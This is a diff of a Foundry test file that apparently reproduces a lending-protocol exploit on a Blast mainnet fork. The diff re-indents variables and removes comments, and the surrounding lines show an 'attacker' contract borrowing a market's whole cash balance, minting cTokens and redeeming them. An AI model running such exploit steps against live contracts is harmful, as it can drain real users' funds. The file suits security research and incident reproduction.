@@ -31,17 +31,17 @@ contract AllienFlashTest is Test {
     IAllienoracle AllienpriceFeed = IAllienoracle(0x3A9B69eE4b7F238c38380A540B211f682f724968);
     address public attacker;
     uint supplyRate;
-  uint exchangeRate;
-  uint estimateBalance;
-  uint balanceOfUnderlying;
-  uint borrowedBalance;
-  uint price;
-  uint rerror; 
-  uint liquidity; 
-  uint shortfall;
-  uint colFactor;
-  uint supplied;
-  uint liqbalance;
+    uint exchangeRate;
+    uint estimateBalance;
+    uint balanceOfUnderlying;
+    uint borrowedBalance;
+    uint price;
+    uint rerror; 
+    uint liquidity; 
+    uint shortfall;
+    uint colFactor;
+    uint supplied;
+    uint liqbalance;
 
     function setUp() public {
         vm.createSelectFork("https://rpc.ankr.com/blast", 6814362);
@@ -90,7 +90,7 @@ contract AllienFlashTest is Test {
     }
 
     function borroblast() internal {
-        uint256 ttcashwethafsupply = Allien.getTotalCash(address(blast)); // 5 WETH with 18 decimals
+        uint256 ttcashwethafsupply = Allien.getTotalCash(address(blast)); 
         emit log_named_decimal_uint("totoal cash for blast", ttcashwethafsupply, 18);
         Allien.borrow(address(this), address(this), address(blast), ttcashwethafsupply);
         emit log_named_decimal_uint("Attacker blast borrowed from allien", IERC20(blast).balanceOf(address(this)), 18);
@@ -109,7 +109,7 @@ contract AllienFlashTest is Test {
 
         blast.approve(address(C_blast), blast.balanceOf(address(this)));
 
-        C_blast.mint(blast.balanceOf(address(this))); // supply 1 btc.
+        C_blast.mint(blast.balanceOf(address(this))); 
         emit log_named_decimal_uint("C_blast balance of borrower:", C_blast.balanceOf(address(this)),8);
 
 
@@ -131,7 +131,7 @@ contract AllienFlashTest is Test {
     function RedeemBlast() internal {
         uint cTokenAmount = C_blast.balanceOf(address(this));
         C_blast.redeem(cTokenAmount);
-        emit log_named_uint("Redeemed blast:", blast.balanceOf(address(this))); //0.99999999 btc
+        emit log_named_uint("Redeemed blast:", blast.balanceOf(address(this)));
         balanceOfUnderlying = C_blast.balanceOfUnderlying(address(this));
         emit log_named_uint("supplied:", balanceOfUnderlying);
     }
